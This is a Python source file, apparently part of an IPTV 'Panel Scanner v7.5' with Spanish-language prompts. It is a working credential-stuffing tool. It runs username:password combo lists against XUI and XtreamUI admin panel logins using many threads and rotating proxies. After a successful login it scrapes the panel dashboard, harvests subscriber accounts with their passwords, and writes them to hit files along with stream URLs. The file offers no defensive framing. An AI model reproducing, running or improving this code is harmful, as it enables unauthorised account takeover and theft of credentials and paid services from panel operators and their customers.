            f"{Fore.LIGHTWHITE_EX} <,{Fore.RESET}{Fore.LIGHTRED_EX}︻╦╤─ {Fore.RESET}💥💥   {Fore.LIGHTGREEN_EX}ʜɪᴛ'ꜱ ᴏʙᴛᴇɴɪᴅᴏꜱ{Fore.RESET}\n"
            f"{Fore.LIGHTWHITE_EX} _/﹋\_  {Fore.RESET}     {Fore.LIGHTYELLOW_EX}｢ᴩᴀɴᴇʟ➝ {contador_hits_str}{Fore.RESET}{Fore.LIGHTYELLOW_EX} ᴍ3ᴜ➝ {contador_hits_m3u_str}{Fore.RESET}{Fore.LIGHTYELLOW_EX}｣{Fore.RESET}\n"
        )
        
        #print(f"\r{banner}", end="", flush=True)
        
        banner_lines = banner.count('\n') + 1
        remaining_lines = max(0, terminal_height - banner_lines)
        banner += '\n' * remaining_lines
        
        with print_lock:
            print("\033[3J\033[H\033[2J", end="", flush=True)
            print(banner, end="", flush=True)
            time.sleep(0.02)
        
    def save_hit_user(self, username: str, password: str, tabla: List[Dict[str, Any]], 
                     url: str, url_host_port: str, resultado_hits_user: str,
                     resultado_combo_user: str, proxy_used: Any, 
                     user_info_extractor: 'UserInfoExtractor') -> None:
        for user in tabla:
            if user['Status'] == 'Active':
                with self.hits_m3u_lock:
                    self.hits_m3u += 1
                self.save_combo_user(user['Username'], user['Password'], resultado_combo_user)
                user_info = user_info_extractor.get_user_info(user['Username'], user['Password'], url_host_port, proxy_used)
                if user_info:
                    hit_str = user_info_extractor.format_user_info(user_info, url_host_port, proxy_used,url,username, password)
                else:
                    hit_str = f"""
╭───✦ 彡★ нιт нυηтєя ραηєℓєѕ 彡★
├● 💻 ᴩᴀɴᴇʟ ➨ {url}
├● 👑 ᴜꜱᴇʀ  ➨ {username}
├● 🔐 ᴩᴀꜱꜱ  ➨ {password}
╰───✦
╭───✦ 彡★ нιт нυηтєя 彡★
├● 👑 ᴜꜱᴇʀ : {user['Username']}
├● 🔐 ᴩᴀꜱꜱ : {user['Password']}
├● ✅ ꜱᴛᴀᴛᴜꜱ : {user['Status']}
├● 📶 ᴏɴʟɪɴᴇ: {user['Online']}
├● 🧬 ᴛʀɪᴀʟ : {user['Trial']}
├● 🔌 ᴄᴏɴɴᴇᴄᴛɪᴏɴꜱ: {user['Active_Connections']}
├● 📅 ᴇxᴩɪʀᴀᴛɪᴏɴ: {user['Expiration']}
├● ⏰ ʟᴀꜱᴛ ᴄᴏɴɴᴇᴄᴛɪᴏɴ: {user['Last_Connection']}
├● ⚡ ꜱᴄᴀɴᴛʏᴩᴇ : ᴩᴀɴᴇʟ ꜱᴄᴀɴɴᴇʀ
╰───✦ᴠ7.5 | ᴩy ᴄᴏɴꜰɪɢ ʙy ɪꜱʜɪʀᴏ

 🌐 ᴍ3ᴜ : {url_host_port}/get.php?username={user['Username']}&password={user['Password']}&type=m3u_plus
"""
                with open(resultado_hits_user, "a", encoding="utf-8") as result:
                    result.write(f"{hit_str}\n")

    def save_combo_server(self, username: str, password: str, resultado_combo_server: str) -> None:
        self.save_combo(resultado_combo_server, username, password)

    def save_combo_user(self, username: str, password: str, resultado_combo_user: str) -> None:
        self.save_combo(resultado_combo_user, username, password)

    def save_combo(self, filename: str, username: str, password: str) -> None:
        try:
            with open(filename, "a", encoding="utf-8") as result:
                result.write(f"{username}:{password}\n")
        except Exception as e:
            print(f"❌ Error al guardar combo en {filename}: {e}")

    def save_hit_server(self, username: str, password: str, datos: Dict[str, Any], url: str, filepath: str) -> None:
        if Config.DEBUG_MODE == True:
            print(f"{Fore.LIGHTYELLOW_EX}Guardando hit en {filepath}...{Fore.RESET}")
        open_connections = datos.get("open_connections", 0)
        online_users = datos.get("online_users", 0)
        active_accounts = datos.get("active_accounts", "0")
        credits = datos.get("credits", "0")
        credits_assigned = datos.get("credits_assigned", 0)
        
        hit_str = f"""
╭───✦ 彡★ нιт нυηтєя ραηєℓєѕ 彡★
├● 💻 ᴩᴀɴᴇʟ  ➨ {url}
├● 🧑‍💻 ᴜꜱᴇʀ  ➨ {username:<40}
├● 🔒 ᴩᴀꜱꜱ  ➨ {password:<40}
├● 📡 ᴏᴩᴇɴ ᴄᴏɴɴᴇᴄᴛɪᴏɴꜱ ➨ {open_connections:<5}
├● 👤 ᴏɴʟɪɴᴇ ᴜꜱᴇʀꜱ ➨ {online_users:<5}
├● ✅ ᴀᴄᴛɪᴠᴇ ᴀᴄᴄᴏᴜɴᴛꜱ ➨ {active_accounts:<5}
├● 💵 ᴄʀᴇᴅɪᴛꜱ  ➨ {credits:<5}
├● 🎯 ᴀꜱꜱɪɢɴᴇᴅ ᴄʀᴇᴅɪᴛꜱ  ➨ {credits_assigned:<5}
├● ⚡ ꜱᴄᴀɴᴛʏᴩᴇ : ᴩᴀɴᴇʟ ꜱᴄᴀɴɴᴇʀ
╰───✦ᴠ7.5 | ᴩy ᴄᴏɴꜰɪɢ ʙy ɪꜱʜɪʀᴏ
"""
        with open(filepath, "a", encoding="utf-8") as result:
            result.write(f"{hit_str}\n")

    def process_hits_parallel(self, username: str, password: str, tabla: List[Dict[str, Any]], 
                            url: str, url_host_port: str, resultado_hits_user: str,
                            resultado_combo_user: str, proxy_used: Any, 
                            user_info_extractor: 'UserInfoExtractor') -> None:
        
        max_workers = min(5, max(1, len(tabla)))
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [
                executor.submit(
                    self.save_hit_user,
                    username, password, [item], url, url_host_port,
                    resultado_hits_user, resultado_combo_user, proxy_used,
                    user_info_extractor
                )
                for item in tabla
            ]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"[!] Error procesando hit: {e}")

class LoginHandler:
    def __init__(self, scanner: PanelScanner):
        self.scanner = scanner
        headers = Config.get_login_headers()
        self.request_handler = RequestHandler(headers)

    def attempt_login(self, combos_chunk: List[List[str]], url: str, panel_type: str,
                     total_combos: int, server_info: Dict[str, Any], bot_id: str,
                     url_clean: str, output_files: Dict[str, str], url_host_port: str,
                     proxy_handler: ProxyHandler,stop_event: threading.Event) -> None:
        for combo in combos_chunk:
            try:
                username, password = combo
            except ValueError as e:
                continue
            body = {
                "referrer": "logout",
                "username": username,
                "password": password,
                "login": ""
            }
            if stop_event.is_set():
                print(f"[{bot_id}] Proxies agotados, deteniendo threads...")
                return
            
            if proxy_handler.use_proxy and proxy_handler.live_count <= 0:
                print(f"[{bot_id}] Proxies agotados, deteniendo threads...")
                stop_event.set()
                return
            
            with requests.Session() as session:
                session.headers.update(Config.get_login_headers())
                response, proxy_used, proxy_str, error_msg = self.request_handler.make_request(
                    session, url, body, proxy_handler
                )
                self.scanner.completed += 1
                
                elapsed_time = time.time() - self.scanner.start_time
                elapsed_str = self.scanner.format_elapsed_time(elapsed_time)
                cpm = int(round((self.scanner.completed / elapsed_time) * 60, 0)) if elapsed_time > 0 else 0
                progress_percent = round((self.scanner.completed / total_combos) * 100, 1) if total_combos > 0 else 0
                
                status_color = Fore.YELLOW if response is None else (Fore.LIGHTGREEN_EX if response.status_code == 302 else Fore.LIGHTYELLOW_EX)
                status_code = error_msg if response is None else response.status_code
                
                contador_hits_str = f"\033[42m\033[1;33m {self.scanner.hits} \033[0m" if self.scanner.hits > 0 else f"\033[41m\033[37m {self.scanner.hits} \033[0m"
                contador_hits_m3u_str = f"\033[42m\033[1;33m {self.scanner.hits_m3u} \033[0m" if self.scanner.hits_m3u > 0 else f"\033[41m\033[37m {self.scanner.hits_m3u} \033[0m"
                dynamic_color = Config.COLORS[(self.scanner.completed // 10) % len(Config.COLORS)]
                panel_type_text = Config.PANEL_TYPE_DISPLAY.get(panel_type, Config.PANEL_TYPE_DISPLAY['unknown'])
                
                self.scanner.generate_banner(
                    username, password, status_color, status_code, total_combos, progress_percent,
                    cpm, bot_id, elapsed_str, server_info, panel_type_text, dynamic_color, 
                    contador_hits_str, contador_hits_m3u_str, url_clean, proxy_handler, proxy_str
                )
                
                if response is not None and response.status_code == 302:
                    with self.scanner.hits_lock:
                        self.scanner.hits += 1
                        dashboard_data = self.scanner.get_dashboard_data(url, session, panel_type == 'xui', proxy_used,proxy_handler)
                        users_data = (
                            self.scanner.get_data_from_table_xui(url, session,proxy_used,proxy_handler) if panel_type == 'xui'
                            else self.scanner.get_data_from_table_xc(url, session,proxy_used,proxy_handler))
                        
                        self.scanner.save_combo_server(username, password, output_files['combo_server'])
                        self.scanner.save_hit_server(username, password, dashboard_data, url, output_files['hits_server'])
                        self.scanner.process_hits_parallel(
                            username, password, users_data, url, url_host_port,
                            output_files['hits_user'], output_files['combo_user'],
                            proxy_used, self.scanner.user_info_extractor
                        )
class FileManager:
    @staticmethod
    def create_folders() -> None:
        directories = [
            Config.HITS_DIR,
            os.path.join(Config.HITS_DIR, "𝐇𝐢𝐭𝐬_𝐒𝐞𝐫𝐯𝐞𝐫"),
            os.path.join(Config.HITS_DIR, "𝐇𝐢𝐭𝐬_𝐔𝐬𝐞𝐫"),
            os.path.join(Config.HITS_DIR, "𝐂𝐨𝐦𝐛𝐨𝐬_𝐒𝐞𝐫𝐯𝐞𝐫"),
            os.path.join(Config.HITS_DIR, "𝐂𝐨𝐦𝐛𝐨𝐬_𝐔𝐬𝐞𝐫"),
            Config.PROXIES_DIR,
        ]
        for dir_path in directories:
            try:
                os.makedirs(os.path.abspath(dir_path), exist_ok=True)
            except Exception as e:
                print(f"❌ Error creando {dir_path}: {e}")

class UIManager:
    
    @staticmethod
    def set_terminal_title(title):
        if os.name == 'nt':  # Windows
            os.system(f"title {title}")
        else:  # Linux/macOS
            sys.stdout.write(f"\33]0;{title}\a")
            sys.stdout.flush()
            
    @staticmethod
    def clear_screen():
        os.system('cls' if os.name == 'nt' else 'clear')

    @staticmethod
    def fade_in_line(line, steps=10, delay=0.02):
        for i in range(steps):
            if i < steps // 2:
                style = Style.DIM
            else:
                style = Style.NORMAL if i < steps - 2 else Style.BRIGHT

            sys.stdout.write('\r' + style + line)
            sys.stdout.flush()
            time.sleep(delay)
        print()
    @staticmethod
    def show_banner():
        banner_lines = [
            f"{Fore.LIGHTYELLOW_EX}»»——————————————————👑——————————————————««",
            f"{Fore.LIGHTYELLOW_EX}   _  _ _ _     _  _          _  ",
            f"{Fore.LIGHTYELLOW_EX}  | || {Fore.RED}(_){Fore.LIGHTYELLOW_EX} |_  | || |_  _ _ _| |_ ___ _ _",
            f"{Fore.LIGHTYELLOW_EX}  | __ | |  _| | __ | || | ' \\  _/ -_) '_|",
            f"{Fore.LIGHTYELLOW_EX}  |_||_|_|\\__| |_||_|\\_,_|_||_\\__\\___|_|",
            f"{Fore.LIGHTCYAN_EX}     {Fore.RED}彡★ {Fore.LIGHTCYAN_EX}    𝐏𝐀𝐍𝐄𝐋 𝐒𝐂𝐀𝐍𝐍𝐄𝐑 ᴠ𝟕.𝟓  {Fore.LIGHTRED_EX} ★彡",
            f"{Fore.LIGHTYELLOW_EX}»»——————————————————👑——————————————————««",
            f"{Fore.LIGHTCYAN_EX}       ⚜️  ᴩy ᴅᴇᴠᴇʟᴏᴩᴇᴅ ʙy ɪꜱʜɪʀᴏ  ⚜️ {Fore.RESET}"
        ]

        UIManager.clear_screen()
        UIManager.set_terminal_title("PanelScannerV7.5")
        for line in banner_lines:
            UIManager.fade_in_line(line.center(0))
            time.sleep(0.1)
    
    @staticmethod
    def get_panel_url() -> Tuple[str, str, str]:
        while True:
            url = input(f"\n{Fore.LIGHTYELLOW_EX}[*] Ingresa la URL del Panel :{Fore.RESET} \n"
                        f"{Fore.LIGHTRED_EX}➤ {Fore.RESET}{Fore.LIGHTCYAN_EX}").strip()

            if not url:
                print(f"\n{Fore.RED}❌ No puedes dejar la URL vacía. Intenta de nuevo.{Fore.RESET}")
                continue

            if not Config.URL_PATTERN.match(url):
                print(f"\n{Fore.RED}❌ Formato de URL no válido. Intenta de nuevo.{Fore.RESET}")
                continue

            if not url.startswith(("http://", "https://")):
                url = "http://" + url

            try:
                print(f"\n{Fore.LIGHTCYAN_EX}🔍 Validando url del Panel...{Fore.RESET}")
                
                session = requests.Session()
                session.headers.update(Config.get_login_headers())
                response = session.get(url, timeout=7, verify=False, allow_redirects=False)

                if response.status_code >= 400:
                    print(f"\n{Fore.RED}❌ La URL respondió con status {response.status_code}. Intenta otra.{Fore.RESET}")
                    continue

            except requests.RequestException as e:
                print(f"\n{Fore.RED}❌ No se pudo conectar a la URL. Intenta otra.{Fore.RESET}")
                print(f"\n{Fore.RED}❌ Error: {e}{Fore.RESET}")
                continue

            url_clean = url.replace("http://", "").replace("https://", "")
            domain = url_clean.split("/")[0]
            return url, url_clean, domain

    @staticmethod
    def get_host_port() -> Tuple[str, str, str, str]:
        print(f"\n\n{Fore.LIGHTBLUE_EX}💡 Ingresa el Host y el Puerto para\n generar la lista M3U.")
        while True:
            url_host_port = input(f"\n{Fore.LIGHTYELLOW_EX}[*] Ingresa Host:Port :{Fore.RESET} \n{Fore.LIGHTRED_EX}➤ {Fore.RESET}{Fore.LIGHTCYAN_EX}").strip()
            url_host_port_clean = url_host_port.replace("http://", "").replace("https://", "")
            match = re.match(Config.HOST_PORT_PATTERN, url_host_port)
            if match:
                host, port = match.groups()
                print(f"\n{Fore.GREEN}✅ Host: {host}, Port: {port}{Fore.RESET}")
                return url_host_port, url_host_port_clean, host, port
            print(f"\n{Fore.RED}❌ Formato inválido. Debes ingresar en el formato host:port.{Fore.RESET}")

    @staticmethod
    def select_combo_file() -> str:
        if not os.path.exists(Config.COMBO_DIR):
            print(f"{Fore.RED}Error: La carpeta {Config.COMBO_DIR} no existe.{Style.RESET_ALL}")
            sys.exit(1)
        
        files = sorted([f for f in os.listdir(Config.COMBO_DIR) if os.path.isfile(os.path.join(Config.COMBO_DIR, f))])
        if not files:
            print(f"{Fore.RED}No se encontraron combos en {Config.COMBO_DIR}{Style.RESET_ALL}")
            sys.exit(1)
        
        print(f"{Fore.LIGHTYELLOW_EX}\n[*] Combos Disponibles:{Style.RESET_ALL}")
        for idx, file in enumerate(files, start=1):
            print(f" {Fore.LIGHTRED_EX}{idx}){Fore.RESET} {Fore.YELLOW}{file}{Fore.RESET}")
        
        while True:
            try:
                choice = int(input(f"{Fore.LIGHTYELLOW_EX}\n[*] Selecciona el combo: \n{Fore.RESET}{Fore.LIGHTRED_EX}➤ {Fore.RESET}{Fore.LIGHTCYAN_EX}"))
                if 1 <= choice <= len(files):
                    return os.path.join(Config.COMBO_DIR, files[choice - 1])
                print(f"{Fore.RED}Número inválido.{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}Introduce un número válido{Style.RESET_ALL}")

    @staticmethod
    def get_bot_count() -> int:
        while True:
            try:
                max_threads = int(input(f"{Fore.LIGHTYELLOW_EX}\n[*] Cantidad de Bots: \n{Fore.RESET}{Fore.LIGHTRED_EX}➤ {Fore.RESET}{Fore.LIGHTCYAN_EX}"))
                if max_threads > 0:
                    print(f"\n{Fore.GREEN}Cantidad de Bots asignados: {max_threads}{Style.RESET_ALL}")
                    return max_threads
                print(f"{Fore.RED}Debe ser mayor a cero.{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}Introduce un número válido.{Style.RESET_ALL}")
    
    @staticmethod
    def ask_proxy_settings():
        proxy_handler = ProxyHandler()
        proxy_handler.use_proxy = False
        print(f"\n{Fore.LIGHTYELLOW_EX}[*] ¿Quieres utilizar Proxies?{Fore.RESET}")
        print(f"{Fore.LIGHTRED_EX} 1. SI{Style.RESET_ALL}")
        print(f"{Fore.LIGHTRED_EX} 2. NO{Style.RESET_ALL}")
        use_proxy = input(f"{Fore.LIGHTRED_EX}➤ {Fore.RESET}{Fore.LIGHTCYAN_EX}").strip()
        if use_proxy != "1":
            return proxy_handler

        proxy_handler.use_proxy = True
        proxy_handler.select_proxy_type()

        print(f"{Fore.LIGHTYELLOW_EX}\n[*] Indica el origen de los proxies{Fore.RESET}")
        print(f"{Fore.LIGHTRED_EX} 1) 🌍 Online   {Fore.RESET}")
        print(f"{Fore.LIGHTRED_EX} 2) 📁 Archivo Local   {Fore.RESET}")
        proxy_source = input(f"{Fore.LIGHTRED_EX}➤ {Fore.RESET}{Fore.LIGHTCYAN_EX}").strip()

        if proxy_source == "1":
            print(f"\n{Fore.LIGHTCYAN_EX}Obteniendo proxies gratuitos...{Fore.RESET}")
            if not proxy_handler.fetch_proxies():
                print(f"{Fore.RED}No se pudieron obtener proxies gratuitos.{Fore.RESET}")
                print(f"\n{Fore.LIGHTYELLOW_EX}[*] ¿Quieres continuar sin Proxies?{Fore.RESET}")
                print(f"{Fore.LIGHTRED_EX} 1. SI{Style.RESET_ALL}")
                print(f"{Fore.LIGHTRED_EX} 2. NO{Style.RESET_ALL}")
                without_proxies = input(f"{Fore.LIGHTRED_EX}➤ {Fore.RESET}{Fore.LIGHTCYAN_EX}").strip()
                if without_proxies == "1":
                    proxy_handler.use_proxy = False
                    return proxy_handler
                else:
                    print(f"\n\n{Fore.LIGHTRED_EX}Programa detenido por el usuario.{Style.RESET_ALL}")
                    print("Saliendo...")
                    time.sleep(0.5)
                    sys.exit(0)
        else:
            proxy_dir = Config.PROXIES_DIR
            try:
                proxy_files = [f for f in os.listdir(proxy_dir) if os.path.isfile(os.path.join(proxy_dir, f))]
                if not proxy_files:
                    print(f"{Fore.LIGHTRED_EX}No se encontraron archivos en {proxy_dir}{Style.RESET_ALL}")
                    return proxy_handler
                print(f"\n{Fore.LIGHTYELLOW_EX}[*] Proxies disponibles en {proxy_dir}:{Style.RESET_ALL}")
                for i, file in enumerate(proxy_files, 1):
                    print(f"{Fore.LIGHTRED_EX} {i}) {file}{Style.RESET_ALL}")
                while True:
                    try:
                        choice = int(input(f"{Fore.LIGHTYELLOW_EX}[*] Selecciona el número (1-{len(proxy_files)}): {Style.RESET_ALL}"))
                        if 1 <= choice <= len(proxy_files):
                            selected_file = os.path.join(proxy_dir, proxy_files[choice - 1])
                            break
                        print(f"{Fore.LIGHTRED_EX}Por favor, elige un número entre 1 y {len(proxy_files)}{Style.RESET_ALL}")
                    except ValueError:
                        print(f"{Fore.LIGHTRED_EX}Ingresa un número válido{Style.RESET_ALL}")
                if not proxy_handler.fetch_proxies(proxy_file=selected_file):
                    print(f"{Fore.LIGHTRED_EX}No se pudieron cargar proxies desde el archivo{Style.RESET_ALL}")
                    return proxy_handler
            except Exception as e:
                print(f"{Fore.LIGHTRED_EX}Error al acceder a {proxy_dir}: {str(e)[:20]}{Style.RESET_ALL}")                
                return proxy_handler
        return proxy_handler
    
def main():
    scanner = PanelScanner()
    login_handler = LoginHandler(scanner)
    file_manager = FileManager()
    ui_manager = UIManager()
   
    file_manager.create_folders()
    ui_manager.show_banner()
    
    url, url_clean, domain = ui_manager.get_panel_url()
    panel_type = scanner.get_panel_type(url)

    if panel_type == 'unknown':
        print(f"{Fore.RED}\n🛑 No se pudo determinar el tipo de panel.{Fore.RESET}")
        print(f"{Fore.LIGHTCYAN_EX}📢 Paneles compatibles: XUI, XtreamUI/Codes.{Fore.RESET}")
        sys.exit(1)
    else:
        print(f"\n{Fore.LIGHTGREEN_EX}✅ Panel detectado: {Config.PANEL_TYPE_DISPLAY.get(panel_type, Config.PANEL_TYPE_DISPLAY['unknown'])}{Fore.RESET}")
        
    url_host_port, _, host, _ = ui_manager.get_host_port()
    scanner.proxy_manager = ui_manager.ask_proxy_settings()
    
    input(f"\n{Fore.LIGHTYELLOW_EX}[*] Enter para continuar{Fore.RESET}")
    input_file = ui_manager.select_combo_file()
    max_threads = ui_manager.get_bot_count()
    
    domain_output = domain.replace('.', '_').replace(':', '_')
    output_files = {
        'hits_server': os.path.join(Config.HITS_DIR, "𝐇𝐢𝐭𝐬_𝐒𝐞𝐫𝐯𝐞𝐫", f"{domain_output}.txt"),
        'hits_user': os.path.join(Config.HITS_DIR, "𝐇𝐢𝐭𝐬_𝐔𝐬𝐞𝐫", f"{domain_output}.txt"),
        'combo_server': os.path.join(Config.HITS_DIR, "𝐂𝐨𝐦𝐛𝐨𝐬_𝐒𝐞𝐫𝐯𝐞𝐫", f"{domain_output}.txt"),
        'combo_user': os.path.join(Config.HITS_DIR, "𝐂𝐨𝐦𝐛𝐨𝐬_𝐔𝐬𝐞𝐫", f"{domain_output}.txt")
    }
    
    with open(input_file, "r", encoding='utf-8') as f:
        combos = [line.strip().split(":") for line in f.readlines() if ":" in line]
    
    total_combos = len(combos)
    print(f"\n{Fore.LIGHTYELLOW_EX}Iniciando escaneo ...{Fore.RESET}")
    
    clean_domain = domain.split(":")[0]
    server_info = scanner.get_server_info(clean_domain)
        
    chunk_size = total_combos // max_threads
    threads = []
    
    for i in range(max_threads):
        start_index = i * chunk_size
        end_index = start_index + chunk_size if i < max_threads - 1 else total_combos
        combos_chunk = combos[start_index:end_index]
        bot_id = f"Bot_{i + 1}"
        
        thread = threading.Thread(
            target=login_handler.attempt_login,
            args=(combos_chunk, url, panel_type, total_combos, server_info,bot_id, url_clean, output_files, url_host_port, scanner.proxy_manager, stop_event)
        )
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.LIGHTRED_EX}Programa detenido por el usuario.{Style.RESET_ALL}")
        print("Saliendo...")
        time.sleep(0.5)
        sys.exit(0)